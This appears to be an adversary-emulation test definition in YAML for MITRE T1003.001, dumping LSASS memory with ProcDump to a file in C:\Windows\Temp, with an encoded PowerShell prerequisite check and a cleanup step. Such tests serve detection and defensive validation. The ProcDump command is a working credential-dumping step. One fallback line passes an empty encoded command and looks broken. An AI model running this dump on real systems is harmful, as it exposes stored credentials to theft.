- id: 4eef41bb-2f9d-5c21-9208-990855c10832
  name: Soumaia ART Tests - Dump LSASS.exe Memory using ProcDump
  description: 'The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals

    ProcDump.


    Upon successful execution, you should see the following file created c:\windows\temp\lsass_dump.dmp.


    If you see a message saying "procdump.exe is not recognized as an internal or external command", try using the  get-prereq_commands to download and install the ProcDump tool first. (requires elevation)'
  tactic: credential-access
  technique:
    attack_id: T1003.001
    name: 'OS Credential Dumping: LSASS Memory'
  platforms:
    windows:
      cmd:
        command: |-
          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABwAHIAbwBjAGQAdQBtAHAALgBlAHgAZQAiACkAIAB7AGUAeABpAHQAIAAwAH0AIABlAGwAcwBlACAAewBlAHgAaQB0ACAAMQB9AAoA
          if not "%ERRORLEVEL%"=="0" (
              powershell -NoProfile -EncodedCommand 
          )
          "%TEMP%\ART-ExternalPayloads\procdump.exe" -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp
        cleanup: |-
          del "C:\Windows\Temp\lsass_dump.dmp" >nul 2> nul
